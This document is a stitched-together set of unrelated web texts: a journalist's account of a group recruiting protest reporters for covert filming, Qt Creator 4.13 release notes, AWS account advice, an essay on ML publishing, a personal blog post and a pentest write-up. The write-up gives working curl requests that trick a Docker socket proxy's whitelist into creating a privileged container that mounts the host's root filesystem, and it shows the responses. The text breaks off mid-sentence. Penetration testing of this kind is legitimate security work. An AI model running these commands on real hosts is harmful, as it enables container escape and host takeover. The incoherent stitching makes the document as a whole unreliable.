<p>In July, at the request of the ACLU of Oregon, a Multnomah County judge <a rel="noreferrer noopener" href="https://aclu-or.org/en/press-releases/circuit-court-issues-restraining-order-police-surveillance-protesters-response-aclu" target="_blank">issued a temporary restraining order</a> against Portland Police Bureau, barring them from using livestreams as a means of surveillance over local protesters, citing an Oregon law prohibiting law enforcement from “collecting or maintaining information about the political, religious or social views, associations or activities of people who are not suspected of criminal activity.” In Oregon, law enforcement may not collect footage of protesters unless they are suspected of committing a crime.</p>



<p>Cryptonater also used the term “pseudo-press,” likely in response to an increase in the number of people at Portland protests identifying themselves as press. Following a different request in July by the ACLU of Oregon, a U.S. District Judge <a rel="noreferrer noopener" href="https://aclu-or.org/en/press-releases/judge-grants-preliminary-injunction-aclu-case-protect-journalists-and-legal-observers" target="_blank">issued a preliminary injunction</a> blocking Portland police from “dispersing, arresting, threatening to arrest, or targeting journalists or legal observers” at protests, including anyone wearing identifying markers like press passes and badges. Perhaps in an attempt to increase their safety, more people began appearing at Portland protests identified as press. (If that was their aim, it was ineffective; law enforcement officers continued targeting press and legal observers at protests, leading the ACLU of Oregon to demand federal agents with the Department of Homeland Security and U.S. Marshals Service <a rel="noreferrer noopener" href="https://wordpress.com/block-editor/post/catagaitan.com/1265" target="_blank">be sanctioned and held in contempt</a>.)</p>



<p>I couldn’t imagine why an organization claiming to operate at such a grand level and with such advanced technology would have sent this email to me without catching my tweet. But, if on the off chance they were for real, I wanted to collect as many words from them as possible before they found me out. </p>



<p>An hour later, I sent the following response, aiming to sound suggestible and strapped for cash (honestly, who isn’t right now?):</p>

<p>My reply had three questions: How would they recommend responding if someone at a protest caught me filming them, how does their video technology work, and what larger organization are they working for? </p>



<p>To my surprise, they got back to me within a few hours with another lengthy (1,085-word) response:</p>

<p>(<a href="https://catalinagaitancom.files.wordpress.com/2020/08/cryptonater-3.docx" target="_blank" rel="noreferrer noopener">Text version of email available here</a>.)</p>



<p>For anyone unwilling to read 1,085 words, here are this email’s 10 key points:</p>



<ol><li>If hired on, I would continue reporting at Portland protests like I usually do, but wear a pea-sized recording device that looks like a button concealed in a helmet or my clothing;</li><li>This recording device captures both audio and video in low light, and has “millimeter wave capture which allows rendering of faces even if they are wearing cloth masks;”</li><li>The device uses technology from FLIR (a designer of &nbsp;thermal imaging cameras and sensors) and Axon (a company based in Scottsdale, Arizona that develops technology and weapons for law enforcement);</li><li>I would also be equipped with a disposable cell phone with an “SoS text button” that I could press in duress, at which time they would “create a situation” to extract me safely without “compromising me,” including a planned ahead “pseudo-arrest” with local law enforcement or a feigned injury, where “someone dressed as an EMT” would escort me out;</li><li>They hire multiple individuals who do not know each other to record at the same time, along with an analyst and security team “dressed up similar to the protesters and in plain clothes” who would follow me at a distance;</li><li>They say to date, no one they’ve contracted to use this technology has been identified;</li><li>If I was willing to participate, I would attend an in-person meeting at their field office location in Portland or another “major city” of my choosing, sign an NDA and undergo a two-week paid training process;</li><li>Their organization is a private registered corporation in the state of Delaware that monitors and tracks “many freelance press;” and</li><li>The organization expects to see between 10 and 18 months of “continued unrest throughout major urban areas in the US.”</li></ol>



<p>After reading this, my desire to throw up increased ten-fold. But I also started feeling more and more as if this was an elaborate prank. I decided to just ride the wave and sent back this response a few minutes later agreeing to meet with them: </p>

<p>Unfortunately, by 4:06 p.m. on Friday, they claimed to have finally found my tweet from Aug. 20. (What had taken them so long?) Cryptonater sent me the following response, attaching a weirdly blurred screenshot of my tweet: </p>

                                Wednesday August 26, 2020 by <a href="https://www.qt.io/blog/author/eike-ziller">Eike Ziller</a> | <a href="#commento">Comments</a>

<!--more--><h4>General</h4>
<p>Qt Creator supports setting multiple shortcuts for the same action now. Do you ever mix up shortcuts because your second-favorite editor uses different ones than Qt Creator? Just open <em>Preferences</em> &gt; <em>Environment</em> &gt; <em>Keyboard</em>, find the action and press <em>Add</em> (as long as you do not introduce a conflict with another shortcut). Personally I added some Emacsey shortcuts for splitting and some other actions to my configuration. (Since I am on a Mac, Ctrl+X is free to use for me.)</p>
<p>If you wonder where some items from the <em>Window</em> menu went: We moved them to a new <em>View</em> menu, which seems to be common to have.</p>
<h4>Editing</h4>
<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">We updated LLVM for the C++ code model to LLVM 10, implicitly improving support for C++20 features. The code model also received many smaller fixes and improvements. Please refer to the <a href="https://code.qt.io/cgit/qt-creator/qt-creator.git/tree/dist/changes-4.13.0.md?h=4.13#n34" rel=" noopener">change log</a> for details.<br></span></span></p>

<p><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">If you program in Python, you might find a new feature useful: The editor has a new tool button that allows you to open Python interactively, optionally importing the current file as a module, so you can directly start testing what you just wrote.</span></span></span></p>
<p><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">For QML we fixed some issues with Qt 5.15, and added support for required list properties.</span></span></span></p>
<h4>Projects</h4>
<p>Many thanks to <span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">Alexis Jeandet for adding initial support for the <a href="https://mesonbuild.com/" rel=" noopener">Meson build system</a>!<br>Also many thanks to <span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">IncrediBuild for contributing <a href="https://incredibuild.atlassian.net/wiki/spaces/IUM/pages/19202836/IncrediBuild+for+Qt+Creator" rel=" noopener">their Qt Creator integration</a>!</span><br>(<span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">You need to open <em>Help</em> &gt; <em>About Plugins</em> (or <em>Qt Creator</em> &gt; <em>About Plugins</em> on macOS) and enable these plugins before you can use them.</span>)</span></span></p>
<p><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">We completely revamped the CMake support in Qt Creator. One of the biggest issues with CMake support was that Qt Creator had its own idea about the build configuration of a project, and that could conflict heavily with an existing build, or could cause problems if the configuration was changed on the command line later. In the new version, Qt Creator accepts an existing build configuration as the truth, no matter what for example the settings for CMake in the kit are.</span></span><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"></span></span> Qt Creator still reads the configuration, and provides an editor for it, but it will never complain about conflicts anymore. If you want to configure the build for a project from scratch, you have the option to pass any CMake variables that you like, pre-filled with the configuration from the kit. Note that Qt Creator now requires CMake 3.14 or later.</p>
<p>Our auto-test integration supports the <a href="https://github.com/catchorg/Catch2" rel=" noopener">Catch2</a> testing framework now.</p>
<h4>Targets</h4>
<p>QML debugging and profiling on Android works again, and we fixed issues with debugging on x86 and armv7 architectures and the emulator.</p>
<p>We fixed an issue that could lead to the debugger taking a very long time to start up on iOS devices.</p>
<p>Please have a look at our <a href="https://code.qt.io/cgit/qt-creator/qt-creator.git/tree/dist/changes-4.13.0.md?h=4.13" rel=" noopener">change log</a> for an overview of all the other fixes and improvements that are included in Qt Creator 4.13.</p>
<h4>Get Qt Creator 4.13</h4>
<p>The opensource version is available on the <a href="https://www.qt.io/offline-installers">Qt download page under "Qt Creator"</a>, and you find commercially licensed packages on the <a href="https://login.qt.io/">Qt Account Portal</a>. Qt Creator 4.13 is also available as an update in the online installer. Please post issues in our <a href="https://bugreports.qt.io/projects/QTCREATORBUG">bug tracker</a>.

					<div><p><span>Companies often fall into the trap of building standardized infrastructure themselves, then offer it to their teams to run their workloads on. For example:</span></p>
<ul>
<li><span>Compute, IaaS, which let teams spin up and down compute;</span></li>
<li><span>A mix of IaaS and DBaaS, making sure that databases are managed;</span></li>
<li><span>Platform as a Service to let developers build and deploy their app all by themselves without having to maintain the underlying infrastructure;</span></li>
<li><span>Container platforms like Kubernetes to let teams build and deploy anything on it, as long as it can be deployed as a container</span></li>
</ul>
<p><span>The most complex, but most powerful option lets your teams choose individually what systems and deployment technologies they want to use. You can give them full access to the products and services a cloud provider is offering. Instead of only providing a subset of the offerings, like a Kubernetes cluster, you can give teams their own AWS accounts to build and deploy their applications on. If they want to use Kubernetes for example, they can spin up their own Kubernetes cluster. This also implies that the teams need to take ownership of it. They’ll have to make a well-informed decision about the technology they want to run and support. The teams will not only need to provision it, but will also need to ensure they can manage it. Managing a Kubernetes cluster is a lot of work, and maybe they don’t need such complex features or don’t want to spend resources on it. Other managed options like ECS, Elastic Beanstalk, or building AMIs with Packer can be a better option as they don’t require any development resources.</span></p>
<p><span>When implemented correctly within the organization the most noticeable will be the increase in developer velocity and autonomy. Over the years we have helped implement this strategy in various startups and enterprises and have seen a lot of amazing things happen. Below we have summarized a few key points on how to make this strategy successful within your organization using Amazon Web Services (AWS).</span></p></div>

					<div><p><span>When giving users privileged access to a new AWS account, you’ll want to make sure that users cannot use unauthorized services, or create other users with full administrator privileges. A solution to restrict user access is to use Permission Boundaries in IAM.</span></p><p><span>A Permission Boundary can ensure that a user has still full access to the AWS account, but is bound to some limits. When the user tries to create a new IAM user or a new admin role, it’ll get a permission denied when “deny rules” are specified in the Permission Boundary. That way the users can still manage the full AWS account, but can’t circumvent policies and procedures set by the enterprise.</span></p></div>

Identity Provider software can help you with this. Software like Okta and Onelogin can make it easy for users to log in to different AWS accounts. With a single click on a button, they can log in to one or the other account, making it easy to give out and remove access to current and new users.</span></p><p><span>AWS also has “AWS Single Sign-On” which can provide the same capabilities, but with an enterprise directory like Active Directory where the users are stored.</span></p></div>

Security tools to monitor &amp; remediate these compliance issues will be required to keep your accounts safe. AWS Config can be used to invoke rules on config changes to alert and remediate non-compliance resources within Amazon accounts.</span></p><p><span>Amazon services are getting more and more cross-account capabilities to provide cross-account security monitoring and compliance. Besides security, AWS Backups for example can roll out backup policies over all the AWS accounts in your organization.

<p>I am on the NeurIPS advisory board and on the ICLR board, and I have been involved in the organization of these conferences at all levels, for many years. I have been part of discussions with program committees about how to improve these conferences, but usually the discussions are about incremental changes. I wonder if it may be time for rethinking the overall publication process in the field of machine learning (ML). </p>



<p>The landscape has changed in the last couple of decades. In great part this is thanks to the popularity of arXiv, which has greatly accelerated the cycle of information discovery and dissemination. We now have many conferences publishing ML papers (for example my group publishes mostly at NeurIPS, ICML and ICLR, but also in major conferences in computer vision and natural language processing), which means we go from one deadline to the next every two months, roughly. </p>



<p>The research culture has also changed in the last few decades. It is more competitive, everything is happening fast and putting a lot of pressure on everyone, the field has grown exponentially in size, students are more protective of their ideas and in a hurry to put them out, by fear that someone else would be working on the same thing elsewhere, and in general a PhD ends up with at least 50% more papers than what I gather it was 20 or 30 years ago. </p>



<p>The field has almost completely switched to a conference publication model (in fact a large part of computer science has done so too), and each conference paper does not get the chance to be cleaned up as well as a typical journal paper, rarely benefitting from the repeated iterations to improve the paper which is typical of journals. So we are more productive, on the surface, but this stress, productivity fast pace have a price on the depth and quality of the papers we produce. Many papers end up being submitted that in the past would not have been submitted. They may contain errors, lack in rigour or simply be rather incremental. </p>



<p>In the rush preceding a conference deadline, many papers are produced, but there is not enough time to check things properly and the race to put out more papers (especially as first or equal-first author) is humanly crushing. On the other hand, I am convinced that some of the most important advances have come through a slower process, with the time to think deeply, to step back, and to verify things carefully. Pressure has a negative effect on the quality of the science we generate. I would like us to think about <a href="http://slow-science.org/">Slow Science</a> (check their manifesto!).</p>



<p>Motivated by this feeling, I have been thinking of a potentially different publication model for ML, which has some similarity to what has been experimented elsewhere (e.g., <a href="https://vldb.org/">VLDB</a>). I shared these thoughts with the NeurIPS board, and I share them to you here. Here is the content of my message to the board:</p>



<div><div>
<p><em>I would like to see more discussion about ideas to improve the  publication process as a whole in ML, with reviewing being a crucial  element. I’d certainly like to hear your thoughts.<br>My  feeling is that besides the poor incentives for reviewing, our current  system incentivizes incremental work and creates a lot of pressure and  stress on grad students (and researchers in general) to submit as many  papers as possible at each deadline. Students sometimes come to me two months  before a deadline asking if I have ideas of something which could be  achieved in two months.</em></p>



<p><em>In addition, we now  have a bunch of ML conferences (in particular NeurIPS, ICML and ICLR)  with a strong overlap in their content and community, so people just  resubmit their rejected work to the next conference and draw a new  sample of reviewers (and because of the noise, it means a paper  eventually gets accepted, after using a lot of resources from the  community). Plus the fact that all good reviewers are in demand at very specific weeks of the year makes it harder for area chairs to find the  appropriate reviewer for their paper (unlike what happens with  journals).</em></p>



<p><em>This brings to mind a different  model, one where papers are first submitted to a fast turnaround journal  (which could be JMLR in this case) and program committees of each  conference then pick the papers they like the most from the list of  already accepted and reviewed (and scored) papers (assuming the authors  are interested in having their work presented at a conference). </em></p>



<p><em>In  the old days, conferences were important to speed up the research cycle  and have a fast turnaround of ideas. But now we have arXiv which plays  that role much better, so the main role of conferences, besides the socializing, should be to select work to be highlighted and presented  orally, to create a diversified offer of the best and most important ideas arising in our community, to synchronize researchers around this progress. It doesn’t even have to be super-recent work, it could be work  which got done 1 or 2 years ago and is only recently picking up steam  in terms of impact. The deadline system of conferences creates an  incentive to submit half-baked work (and often not even fix things  properly later if the paper is accepted, rather move on to another  publication). If there is an implicit soft deadline (because if I submit  my paper now to JMLR there is uncertainty as to when it will be  accepted and available for selection by a conference) then there is an  incentive to continue working on the paper until it is better polished,  rather than submit it too early. In addition, the richer iterative  feedback of the journal process should lead to higher-quality results at  the end of the day. And having our work in journal form would make it  easier for ML researchers to collaborate with researchers in other  disciplines who value journals and not conferences.</em></p>
</div></div>



<p>I guess this is the beginning of a discussion, and the many researchers who have participated in the conference and journal process in ML would certainly have interesting things to say towards improving this process. And everyone in this community who submits or reviews papers has information about what works and what doesn’t. Let’s put our heads together and explore how we can at the same time improve the quality of our science and improve our lives as human beings.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				    
<p>Legend has it that before his death, Harry Houdini once said: “<em>if it is truly possible for someone to return from the afterlife, I will</em>”. Despite of the fact he was a great illusionist and escape artist, it seems this last proof has revealed to be very hard, even for him. Much simpler trying to escape out of a container. Of course a docker container 🙂 … our topic for today.</p>



<p>The danger of exposing “<code>docker.sock</code>” to a docker container is well-known and the security literature is full of examples (one is <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank" rel="noreferrer noopener">here</a>) leading to container escape and privilege escalation issues in the host machine. But sometimes this is required (if not even necessary) for legitimate purposes, like creating other containers or pushing configuration settings. While the docker security guidelines advocate to not share the Docker UNIX socket inside a container, at the same time the project developers do not give any advice on how to secure such a kind of configuration whenever it is needed for “<em>good reasons</em>”. And that’s why so many companies that adopt docker and deliver services based on it, still today, suffer from this problem.</p>



<p>For example, last year a customer of us has contracted a security firm to check the robustness of their docker infrastructure. One of their main findings was the file “<code>docker.sock</code>” being mounted within some of their containers, which of course was a sufficient condition to compromise the entire host operating system. In the absence of a strong solution coming from the community, our customer has decided to build its own solution. They created a reverse proxy in front of the Docker UNIX socket file that would add authentication/authorization, and would prevent insecure utilization of the Docker socket itself.</p>



<p>Then they asked us to test the new architecture. This is the story of how the sympathetic Red Timmy has managed to bypass it.</p>



<h3>The architecture</h3>



<p>Before moving forward, we must explain a bit the implementation we have been called to test and a picture should make the job easy enough.</p>



<figure><img loading="lazy" width="1024" height="511" src="https://www.redtimmy.com/wp-content/uploads/2020/08/docker-1024x511.png" alt="" srcset="https://www.redtimmy.com/wp-content/uploads/2020/08/docker-1024x511.png 1024w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker-300x150.png 300w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker-768x383.png 768w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker.png 1099w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>In this architecture there are two UNIX socket files now:</p>



<ul><li><code>/var/run/docker.sock</code> is not exposed within the docker containers anymore. It is readable and writable only for the “<code>root</code>” user and the “<code>docker</code>” group. As you already know the docker engine uses it directly.</li><li><code>/var/run/somethingelse.sock</code> is instead the resource exposed within the docker containers. The file is created in order to be readable and writable only by an unprivileged user which is not part of the docker group. In this way the process creating it does not own enough access rights to read and write directly into “<code>/var/run/docker.sock</code>”. The docker engine remains the only one able to do that.</li></ul>



<p>Then a reverse proxy, running as a privileged user, sits in the middle of these two UNIX socket files. It fetches requests from “<code>/var/run/somethingelse.sock</code>” and determines whether or not these must be forwarded to “<code>/var/run/docker.sock</code>” based on a whitelist of authorized values preemptively saved in a configuration file. For example, a request could be let pass through only if it matches a specific HTTP method (<em>GET</em>, <em>POST</em>, etc…), path (for example “<code>/containers/create</code>”) and/or JSON body.</p>



<p>At the same way the reverse proxy returns the replies from “<code>docker.sock</code>” to “<code>somethingelse.sock</code>” once they are in the pipeline. At first glance the workflow looked fine and flawless.</p>



<h3>Let the dance begin</h3>



<p>Ok, all clear. We have been provided with access to a docker container:</p>



<div><div>
<div><p><code>[root@dockerhost ~]# <strong>docker exec -it 7c4e2742becb bash</strong><br>bash-4.4$</code> &lt;-- container command prompt</p></div>
</div></div>







<p>Also our handsome UNIX socket file is where it is supposed to be:</p>



<p><code>bash-4.4$ <strong>ls –al /var/run/somethingelse.sock</strong><br>srw-------  1 unpriv root 0 Feb 13 11:31 somethingelse.sock</code></p>



<p>Now we must find a way to escape out of there. First thing we try is to leverage the “old” trick as documented in the report that our customer has received from the security firm they had originally contracted:</p>



<p><code>bash-4.4$ curl –i –s <em>–-unix-socket /<u>var/run/somethingelse.sock</u></em> –X POST –H ‘Content-Type: application/json’ –data-binary ‘{<strong>"</strong>Hostname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>Domainname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>User<strong>"</strong>: <strong>""</strong>,<strong>"</strong>AttachStdin<strong>"</strong>: true,<strong> "</strong>AttachStdout<strong>"</strong>: true,<strong> "</strong>AttachStderr<strong>"</strong>: true,<strong> "</strong>Tty<strong>"</strong>: true,<strong>"</strong>OpenStdin<strong>"</strong>: true,<strong>"</strong>StdinOnce<strong>"</strong>: true,<strong>"</strong>Entrypoint<strong>"</strong>: <strong>"</strong>/bin/bash”,”Image<strong>"</strong>: <strong>"</strong>dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT<strong>"</strong>,<strong>"</strong>Volumes<strong>"</strong>: {<strong>"</strong>/hostos/<strong>"</strong>: {}}, <strong>"</strong>HostConfig<strong>"</strong>: {<strong>"Binds": ["/:/hostos"]</strong>, <strong>"</strong>Privileged<strong>"</strong>: true}}’ http://localhost<strong>/containers/create</strong></code></p>



<p>The main difference in our command is that instead of establishing a communication channel with “<code>/var/run/docker.sock</code>” (not mounted in the container) we target “<code>/var/run/somethingelse.sock</code>” (which is instead mounted in the container). All the hacking steps are performed with curl. Specifically, as we are communicating with a UNIX domain socket, the “<code>--unix-socket &lt;filename&gt;</code>” option is adopted.</p>



<p>The command above is the same (a bit extended) as specified in the section “<strong><em>Create the container with the mounted volume</em>” </strong>of this online <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank" rel="noreferrer noopener">tutorial</a>, which the penetration tester had linked into his report. I strongly suggest you to read that post before going ahead with this one, if you are not familiar with the technique in general. Anyway, even if you are not familiar, below follows a short explanation of what we were trying to do with that command.</p>



<p>Basically, from inside the container we are in, we are trying to <strong>create</strong> another container that, once started, will have the root directory “<strong><code>/</code></strong>”of the host operating system mounted under its “<strong><code>/hostos/</code></strong>” folder. If that can be done, it is game over. Just connecting to the new container and launching the command “<code>chroot /hostos</code>” would provide the attacker with full access to the host operating system and all its files.</p>



<p>In our case instead the reverse proxy replied with:</p>



<p><code>HTTP/1.1 403 Forbidden</code></p>



<p>Honestly it was expected. Something else had to be attempted.</p>



<h3><strong>Time for circumvention</strong></h3>



<p>After a bit of trial and error we understand that the stricter check is performed on the value passed to “<code>Binds</code>”. When we provide the string “<code>/:/hostos</code>” trying to map the filesystem “<code>/</code>” of the host into the “<code>/hostos</code>” directory of the container, the request is rejected because the specified string is not in the whitelist. However we discovered, for example, that “<code>/dev/log:/dev/log</code>” is an accepted value instead. It means the reverse proxy allows us to create a container from inside another container when that value is provided. Of course there is nothing special with using “<code>/dev/log</code>” to bypass the filter. But what if the strings “<code>/:/hostos</code>” and “<code>/dev/log:/dev/log</code>” are both specified as part of the same “<code>Binds</code>” parameter, like below?</p>



<p><code>bash-4.4$ curl –i –s <em>–-unix-socket /<u>var/run/somethingelse.sock</u></em> –X POST –H ‘Content-Type: application/json’ –data-binary ‘{<strong>"</strong>Hostname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>Domainname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>User<strong>"</strong>: <strong>""</strong>,<strong>"</strong>AttachStdin<strong>"</strong>: true,<strong>"</strong>AttachStdout<strong>"</strong>: true,<strong>"</strong>AttachStderr<strong>"</strong>: true,<strong>"</strong>Tty<strong>"</strong>: true,<strong>"</strong>OpenStdin<strong>"</strong>: true,<strong>"</strong>StdinOnce<strong>"</strong>: true,<strong>"</strong>Entrypoint<strong>"</strong>: <strong>"</strong>/bin/bash<strong>"</strong>,<strong>"</strong>Image<strong>"</strong>: <strong>"</strong>dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT<strong>"</strong>,<strong>"</strong>Volumes<strong>"</strong>: {<strong>"</strong>/hostos/<strong>"</strong>: {}}, <strong>"</strong>HostConfig<strong>"</strong>: {<strong>"Binds": ["/:/hostos", "/dev/log:/dev/log"]</strong>, <strong>"</strong>Privileged<strong>"</strong>: true}}’ http://localhost/containers/create</code></p>



<p>Unexpectedly, the reverse proxy replies with:</p>



<p><code>HTTP/1.1 201 Created<br>Api-Version: 1.39<br>Content-Length: 90<br>Content-Type: application/json<br>Date: Fri, 15 May 2020 08:19:58 GMT<br>Docker-Experimental: false<br>Ostype: linux<br>Server: Docker/18.09.11 (linux)<p>{"Id":"4fa6bfc84930[...]","Warnings":null}</p></code></p>



<p>So it means we are allowed to create a new container where the root of the host filesystem is mounted into its “<code>/hostos</code>” directory. To confirm that, we manually started the newly created container from the host OS and then accessed it. This was what we got…</p>



<p><code>[root@4fa6bfc84930 opt]# <strong>ls -al /hostos/</strong><br>[...]<br>drwxr-xr-x. 102 root root 8192 May  6 09:08 etc<br>drwxr-xr-x.   6 root root   56 Feb  7  2018 home<br>drwxr-xr-x.   2 root root    6 Mar 10  2016 media<br>drwxr-xr-x.   2 root root    6 Mar 10  2016 mnt<br>drwxr-xr-x.  17 root root 4096 Mar 24  2017 nfs<br>drwxr-xr-x.   7 root root  106 Jan  7  2019 opt<br>dr-xr-xr-x. 375 root root    0 Nov 23 08:23 proc<br>dr-xr-x---.   8 root root 4096 May 14 13:51 root<br>drwxr-xr-x.  35 root root 1140 May  6 09:08 run<br>lrwxrwxrwx.   1 root root    8 Jan 18  2018 sbin -&gt; usr/sbin<br>[...]</code></p>



<p>…meaning that from inside the container we have total control over the entire host OS filesystem, which is what the reverse proxy implementation was attempting to prevent. Good, but how was that possible? Well, let’s have a look once more at the interested part that made the trick possible:</p>



<p><strong><code>"Binds": ["/:/hostos", "/dev/log:/dev/log"]</code></strong></p>



<p>It seems that in case just one of the strings given to the “<code>Binds</code>” parameter is present in the whitelist, the whole check is considered passed, regardless of the presence of other values that are instead not defined in the whitelist configuration. The logic of the reverse proxy was clearly flawed.</p>



<h3><strong>Start the container just created</strong></h3>



<p>So from inside the current container we have managed to create a new one with full access to the host OS filesystem. But we have not executed anything in the host OS yet…and we are still confined within our unprivileged container.</p>



<p><code>bash-4.4$</code></p>



<p>Let’s try to get out of here. First of all let’s see if after its creation we can also start the container from the place where we are now:</p>



<p><code>curl -i -s --unix-socket /var/run/somethingelse.sock -X POST -H 'Content-Type: application/json' http://localhost/containers/<strong>4fa6bfc84930</strong>[...]/start</code></p>



<p>As indicated in the <a href="https://docs.docker.com/engine/api/v1.39/#operation/ContainerStart" target="_blank" rel="noreferrer noopener">Docker API</a> the endpoint to target this time is “<code>/containers/{ID}/start</code>”, where ID (in bold above) is the value the reverse proxy has returned to us with the previous request. The reply we get is:</p>



<p><code>HTTP/1.1 204 No Content<br>Api-Version: 1.39<br>Date: Fri, 15 May 2020 08:20:34 GMT<br>Docker-Experimental: false<br>Ostype: linux<br>Server: Docker/18.09.11 (linux)</code></p>



<p>It means we are allowed to do that. So far, so good. Now the high privileged container is started and we want to execute a command in …</p></div></div>

<p>How to create good habits and break bad ones.</p>

<p>This episode is part of the Habits series. In this excerpt from my interview with Scott Mitchell (episode 29), Scott and I discuss what atomic habits are, how to use them to create good habits and break bad ones, how I started implementing them in my daily routine more than a year ago, the difference between flow and deliberate practice, and why you should schedule your leisure time.</p>

<p>I'm 21 as of 3 weeks ago.</p>
<p>I've been thinking a lot about how I've spent a huge chunk of my life (especially during my late teens) worrying about what others thought of me.</p>
<p>Also about the many problems this has caused in my life.</p>
<p>I'm sure others can relate, it seems to be a common phenomenon at this age. So common, that there is a pretty popular <a href="http://blog.jonathancai.com/fuck/(https://www.amazon.com/Subtle-Art-Not-Giving-Counterintuitive/dp/0062457713)">book</a> about this exact thing, although it is still on my to-read list.</p>
<p>Anyways, here are a few ways that I've personally learned to care less - a list of ways you can become a bit more indifferent to the everyday "BS". Mileage may vary of course.</p>
<h2 id="1-you-re-not-special">1. You're not special</h2>
<p>It sounds bad, but deflating your ego is actually quite liberating.</p>
<p>To think that others are always critiquing you is to assume that you are important enough to be critiqued.</p>
<p>So a good way to stop worrying about others is to realize that people largely don't worry about you either!</p>
<p>You ain't got haters! You ain't <a href="https://genius.com/63318">Waka Flocka</a>, baby!</p>
<p>This has really helped me begin blogging, because I was worried that people would judge me for what I wrote. But I realized that this is a delusion! I don't have a following, no one really cares about my thoughts, so what's stopping me from just putting them out there?</p>
<p>Of course this technique fails if you really are special. Although then you probably wouldn't be reading my blog in that case. I'd be pretty surprised if Flocka Flame was reading this. But to combat this, it might help to zoom out your field of vision. You might be truly special in our society, but across centuries, most will be forgotten, and at best become another line in a history book. Even if people care right now, they probably won't x years from now.</p>
<p>Ryan Holiday's got a great piece on <a href="https://www.amazon.com/Ego-Enemy-Ryan-Holiday/dp/1591847818/ref=sr_1_1?ie=UTF8&amp;qid=1463889922&amp;sr=8-1&amp;keywords=ego+is+the+enemy">ego</a> which feels relevant.</p>
<h2 id="2-care-more-about-other-things">2. Care more about other things</h2>
<p>So this entire post is actually somewhat misleading.</p>
<p>If we give this a second thought, to not worry about anything seems bad also. Being hyper aware of our peers and their opinions of us is certainly bad, but extreme apathy also has its clear problems. So the real goal should be to worry about the <i>right</i> things. As for my misleading blog post title, it's just that "how to not give a fuck" sounds a bit sexier than "how to give a fuck about the right things".</p>
<p>The point is, it's impossible to worry about everything. You don't have the mental capacity to agonize over every decision or thought that crosses your mind.</p>
<p>If you're busy trying to get back to your home on Mars, you don't have time to worry about even <a href="https://www.businessinsider.com/elon-musk-los-angeles-homes-real-estate-portfolio-photos">owning a house</a> here on Earth.</p>
<p>If you run a company that serves billions of users, you don't have time to worry about something as petty as <a href="https://www.businessinsider.com/mark-zuckerberg-same-t-shirt-2014-11">picking out your outfit</a>.</p>
<p>After working at Facebook this summer, I vaguely remembering the term "ruthless prioritization" being thrown around a few times. Maybe it can be attributed mostly to <a href="https://www.inc.com/justin-bariso/sheryl-sandberg-just-gave-some-brilliant-career-ad.html">Sheryl's philosophy</a>, but it seems like a far more polished and office-appropriate way of talking about "how to give a fuck about the <i>right</i> things". So in this frame, "the root of all evil" a.k.a. premature optimization, is just worrying about the wrong things.</p>
<p>There is this cheesy <a href="https://www.youtube.com/watch?v=SqGRnlXplx0">analogy</a> about how your life is like a jar. You fill up with different sized rocks. If you fill it up with sand first, you won't have space for the larger pebbles. But if you fill it up with the larger pebbles first, you can always fill in the gaps with the sand. Rocks first, pebbles next, sand last.</p>
<h2 id="3-you-re-going-to-die">3. You're going to die</h2>
<p>The title of this blog is "memento mori", a Latin phrase that roughly translates to "remember death". My corny ass also got it engraved in my Airpods, but thats besides the point.</p>
<p>Remembering your mortality keeps you from sweating the small stuff.</p>
<p>Who cares if Suzy is spreading rumors about you if you might not make it to next week?</p>
<p>Steve Jobs spoke about death during <a href="https://www.youtube.com/watch?v=xoUfvIb-9U4">his 2005 Stanford commencement address</a>:</p>
<blockquote>
<p>When I was 17, I read a quote that went something like: "If you live each day as if it was your last, someday you'll most certainly be right." It made an impression on me, and since then, for the past 33 years, I have looked in the mirror every morning and asked myself: "If today were the last day of my life, would I want to do what I am about to do today?" And whenever the answer has been "No" for too many days in a row, I know I need to change something.</p>
</blockquote>
<p>I'm no SJ fanboy, but I found this pretty inspirational. I even taped a paper to my wall that said "You're going to die" for the majority of my last college semester (I swear I'm not suicidal, not all the time at least). It probably didn't do much, but I hope that it made me do things that I otherwise wouldn't have.</p>
<p>Paul Graham has his own twist to this, "<a href="http://www.paulgraham.com/vb.html">Life is short</a>". Sounds a bit more polished and elegant I guess.</p>
<p><i>After writing this, I'm thinking that it might not be best for me to use the f word so much. Especially for future employers or business partners... Eh, who gives a fuck...</i></p>

